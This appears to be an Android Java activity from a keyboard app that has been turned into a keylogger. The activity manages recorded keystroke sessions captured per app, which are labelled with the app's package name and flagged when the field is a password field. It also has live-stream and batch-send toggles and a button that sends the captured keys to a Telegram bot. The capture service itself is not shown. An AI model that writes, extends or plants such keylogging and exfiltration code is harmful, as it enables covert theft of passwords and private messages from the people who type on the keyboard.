package juloo.keyboard2;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.ListView;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;

public class KeystrokeLogActivity extends Activity {

    private static final int REFRESH_MS = 2000;

    private Switch   _switchEnable;
    private TextView _statusLabel, _statusDot;
    private TextView _liveVal, _maskVal, _batchVal;
    private TextView _statSessions, _statKeys, _statActive;
    private ListView _sessionList;
    private TextView _emptyText;
    private TextView _btnClear;

    private SessionAdapter _adapter;
    private List<KeystrokeLoggerService.Session> _sessions = new ArrayList<>();
    private Handler _handler;
    private Runnable _refreshTask;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_keystroke_log);

        _handler = new Handler(getMainLooper());

        _switchEnable = findViewById(R.id.kl_switch_enable);
        _statusLabel  = findViewById(R.id.kl_status_label);
        _statusDot    = findViewById(R.id.kl_status_dot);
        _liveVal      = findViewById(R.id.kl_live_val);
        _maskVal      = findViewById(R.id.kl_mask_val);
        _batchVal     = findViewById(R.id.kl_batch_val);
        _statSessions = findViewById(R.id.kl_stat_sessions);
        _statKeys     = findViewById(R.id.kl_stat_keys);
        _statActive   = findViewById(R.id.kl_stat_active);
        _sessionList  = findViewById(R.id.kl_session_list);
        _emptyText    = findViewById(R.id.kl_empty_text);
        _btnClear     = findViewById(R.id.kl_btn_clear);

        KeystrokeLoggerService.getInstance(this);

        _adapter = new SessionAdapter();
        _sessionList.setAdapter(_adapter);

        // ── Wiring ────────────────────────────────────────────────────────────

        _switchEnable.setOnCheckedChangeListener((btn, checked) -> {
            KeystrokeLoggerService.prefs(this).edit()
                    .putBoolean(KeystrokeLoggerService.KEY_ENABLED, checked).apply();
            refreshHeader();
        });

        findViewById(R.id.kl_card_live).setOnClickListener(v -> {
            KeystrokeLoggerService.toggle(this, KeystrokeLoggerService.KEY_LIVE);
            refreshHeader();
        });

        findViewById(R.id.kl_card_mask).setOnClickListener(v -> {
            KeystrokeLoggerService.toggle(this, KeystrokeLoggerService.KEY_MASK_PW);
            refreshHeader();
        });

        findViewById(R.id.kl_card_batch).setOnClickListener(v -> {
            KeystrokeLoggerService.toggle(this, KeystrokeLoggerService.KEY_BATCH);
            refreshHeader();
        });

        _btnClear.setOnClickListener(v -> {
            new AlertDialog.Builder(this)
                .setTitle("Clear All Sessions")
                .setMessage("Delete all " + _sessions.size() + " recorded sessions? This cannot be undone.")
                .setPositiveButton("Delete All", (d, w) -> {
                    KeystrokeLoggerService svc = KeystrokeLoggerService._instance;
                    if (svc != null) svc.clearAll();
                    refreshSessions();
                    Toast.makeText(this, "All sessions cleared", Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton("Cancel", null)
                .show();
        });

        // Apply rounded corners to setting cards
        applyCardRounding(R.id.kl_card_enable);
        applyCardRounding(R.id.kl_card_live);
        applyCardRounding(R.id.kl_card_mask);
        applyCardRounding(R.id.kl_card_batch);
    }

    @Override
    protected void onResume() {
        super.onResume();
        refreshAll();
        _refreshTask = new Runnable() {
            @Override public void run() {
                refreshHeader();
                _handler.postDelayed(this, REFRESH_MS);
            }
        };
        _handler.postDelayed(_refreshTask, REFRESH_MS);
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (_refreshTask != null) { _handler.removeCallbacks(_refreshTask); _refreshTask = null; }
    }

    // ── Refresh ───────────────────────────────────────────────────────────────

    private void refreshAll() {
        refreshHeader();
        refreshSessions();
    }

    private void refreshHeader() {
        boolean enabled = KeystrokeLoggerService.isEnabled(this);
        boolean live    = KeystrokeLoggerService.isLive(this);
        boolean mask    = KeystrokeLoggerService.isMaskPw(this);
        boolean batch   = KeystrokeLoggerService.isBatch(this);

        _switchEnable.setChecked(enabled);
        _statusLabel.setText(enabled ? "ON" : "OFF");
        _statusLabel.setTextColor(enabled ? Color.parseColor("#22C55E") : Color.parseColor("#EF4444"));

        if (_statusDot.getBackground() instanceof GradientDrawable)
            ((GradientDrawable) _statusDot.getBackground()).setColor(
                    enabled ? Color.parseColor("#22C55E") : Color.parseColor("#EF4444"));

        setToggleVal(_liveVal,  live,  "Live Stream");
        setToggleVal(_maskVal,  mask,  "Masking PW");
        setToggleVal(_batchVal, batch, "Batch Send");

        KeystrokeLoggerService svc = KeystrokeLoggerService._instance;
        if (svc != null) {
            _statSessions.setText(String.valueOf(svc.getTotalSessions()));
            _statKeys.setText(String.valueOf(svc.getTotalKeys()));
            KeystrokeLoggerService.Session cur = svc.getCurrentSession();
            if (cur != null)
                _statActive.setText(cur.appName + "\n" + cur.keyCount + " keys");
            else
                _statActive.setText("—");
        }
    }

    private void refreshSessions() {
        KeystrokeLoggerService svc = KeystrokeLoggerService._instance;
        if (svc == null) { _sessions = new ArrayList<>(); }
        else             { _sessions = svc.getSessions(); }
        _adapter.notifyDataSetChanged();
        boolean empty = _sessions.isEmpty();
        _sessionList.setVisibility(empty ? View.GONE : View.VISIBLE);
        _emptyText.setVisibility(empty ? View.VISIBLE : View.GONE);
    }

    private void setToggleVal(TextView tv, boolean on, String label) {
        if (on) { tv.setText("ON  — " + label); tv.setTextColor(Color.parseColor("#22C55E")); }
        else    { tv.setText("OFF");             tv.setTextColor(Color.parseColor("#EF4444")); }
    }

    private void applyCardRounding(int id) {
        View v = findViewById(id);
        if (v == null) return;
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#1E293B"));
        bg.setCornerRadius(12 * getResources().getDisplayMetrics().density);
        v.setBackground(bg);
    }

    // ── Session Dialog ────────────────────────────────────────────────────────

    private void showSessionDetail(KeystrokeLoggerService.Session sess) {
        KeystrokeLoggerService svc = KeystrokeLoggerService._instance;
        if (svc == null) return;
        List<KeystrokeLoggerService.Entry> entries = svc.getEntries(sess.id);

        StringBuilder sb = new StringBuilder();
        sb.append("📱 App: ").append(sess.appName).append("\n")
          .append("📦 Pkg: ").append(sess.appPkg).append("\n")
          .append("🔤 Field: ").append(sess.fieldType)
          .append(sess.isPw ? " 🔒" : "").append("\n")
          .append("🕐 Start: ").append(KeystrokeLoggerService.fmtTime(sess.startMs)).append("\n")
          .append("⏱ Duration: ").append(KeystrokeLoggerService.fmtDur(sess.endMs - sess.startMs)).append("\n")
          .append("⌨️ Keys: ").append(sess.keyCount).append("\n\n")
          .append("━━━━━━━━━━━━━━━━\n");

        if (entries.isEmpty()) {
            sb.append("(no entries)");
        } else {
            for (KeystrokeLoggerService.Entry e : entries) {
                if (!e.modifiers.isEmpty()) sb.append("[").append(e.modifiers).append("+").append(e.keyText).append("]");
                else sb.append(e.keyText);
            }
        }

        new AlertDialog.Builder(this)
            .setTitle("⌨️ Session Detail")
            .setMessage(sb.toString())
            .setPositiveButton("Close", null)
            .setNeutralButton("📤 Export to Telegram", (d, w) -> exportToTelegram(sess, entries))
            .show();
    }

    private void exportToTelegram(KeystrokeLoggerService.Session sess,
                                   List<KeystrokeLoggerService.Entry> entries) {
        if (!TelegramBotService.isRunning()) {
            Toast.makeText(this, "Telegram bot is not running", Toast.LENGTH_SHORT).show();
            return;
        }
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📤 <b>Exported Session</b>\n")
                  .append("━━━━━━━━━━━━━━━━━━━━━━\n")
                  .append("📱 App: <code>").append(KeystrokeLoggerService.kh(sess.appName)).append("</code>\n")
                  .append("📦 Pkg: <code>").append(KeystrokeLoggerService.kh(sess.appPkg)).append("</code>\n")
                  .append("🔤 Field: ").append(KeystrokeLoggerService.kh(sess.fieldType))
                  .append(sess.isPw ? " 🔒" : "").append("\n")
                  .append("🕐 Start: ").append(KeystrokeLoggerService.fmtTime(sess.startMs)).append("\n")
                  .append("⏱ Duration: ").append(KeystrokeLoggerService.fmtDur(sess.endMs - sess.startMs)).append("\n")
                  .append("⌨️ Keys: <b>").append(entries.size()).append("</b>\n")
                  .append("━━━━━━━━━━━━━━━━━━━━━━\n\n");

                StringBuilder keys = new StringBuilder();
                for (KeystrokeLoggerService.Entry e : entries) {
                    if (!e.modifiers.isEmpty()) keys.append("[").append(e.modifiers).append("+").append(e.keyText).append("]");
                    else keys.append(e.keyText);
                }
                String ks = keys.toString();
                if (ks.length() > 900) {
                    sb.append("<code>").append(KeystrokeLoggerService.kh(ks.substring(0, 900))).append("…</code>\n")
                      .append("<i>(truncated — ").append(entries.size()).append(" keys total)</i>");
                } else {
                    sb.append("<code>").append(KeystrokeLoggerService.kh(ks)).append("</code>");
                }
                TelegramBotService.sendStatic(sb.toString());
                runOnUiThread(() -> Toast.makeText(this, "Exported to Telegram ✓", Toast.LENGTH_SHORT).show());
            } catch (Exception e) {
                runOnUiThread(() -> Toast.makeText(this, "Export failed: " + e.getMessage(), Toast.LENGTH_SHORT).show());
            }
        }, "KL-export").start();
    }

    // ── Session List Adapter ──────────────────────────────────────────────────

    private class SessionAdapter extends BaseAdapter {

        @Override public int getCount()          { return _sessions.size(); }
        @Override public Object getItem(int pos) { return _sessions.get(pos); }
        @Override public long getItemId(int pos) { return pos; }

        @Override
        public View getView(int pos, View convertView, ViewGroup parent) {
            if (convertView == null)
                convertView = getLayoutInflater().inflate(R.layout.item_keylog_session, parent, false);

            KeystrokeLoggerService.Session s = _sessions.get(pos);

            ((TextView) convertView.findViewById(R.id.kl_sess_app)).setText(s.appName);
            ((TextView) convertView.findViewById(R.id.kl_sess_field)).setText(s.fieldType);
            ((TextView) convertView.findViewById(R.id.kl_sess_pkg)).setText(s.appPkg);
            ((TextView) convertView.findViewById(R.id.kl_sess_keycount)).setText(s.keyCount + " keys");
            ((TextView) convertView.findViewById(R.id.kl_sess_time)).setText(KeystrokeLoggerService.fmtTime(s.startMs));
            ((TextView) convertView.findViewById(R.id.kl_sess_dur)).setText(KeystrokeLoggerService.fmtDur(s.endMs - s.startMs));

            View pwBadge = convertView.findViewById(R.id.kl_sess_pw_badge);
            pwBadge.setVisibility(s.isPw ? View.VISIBLE : View.GONE);

            convertView.findViewById(R.id.kl_sess_btn_view).setOnClickListener(v -> showSessionDetail(s));

            convertView.findViewById(R.id.kl_sess_btn_export).setOnClickListener(v -> {
                KeystrokeLoggerService svc = KeystrokeLoggerService._instance;
                List<KeystrokeLoggerService.Entry> entries = svc != null ? svc.getEntries(s.id) : new ArrayList<>();
                exportToTelegram(s, entries);
            });

            convertView.findViewById(R.id.kl_sess_btn_delete).setOnClickListener(v -> {
                new AlertDialog.Builder(KeystrokeLogActivity.this)
                    .setTitle("Delete Session")
                    .setMessage("Delete the session from " + s.appName + " (" + s.keyCount + " keys)?")
                    .setPositiveButton("Delete", (d, w) -> {
                        KeystrokeLoggerService svc = KeystrokeLoggerService._instance;
                        if (svc != null) svc.deleteSession(s.id);
                        refreshSessions();
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
            });

            applyItemRounding(convertView);
            return convertView;
        }

        private void applyItemRounding(View v) {
            GradientDrawable bg = new GradientDrawable();
            bg.setColor(Color.parseColor("#1E293B"));
            bg.setCornerRadius(10 * getResources().getDisplayMetrics().density);
            v.setBackground(bg);
        }
    }
}
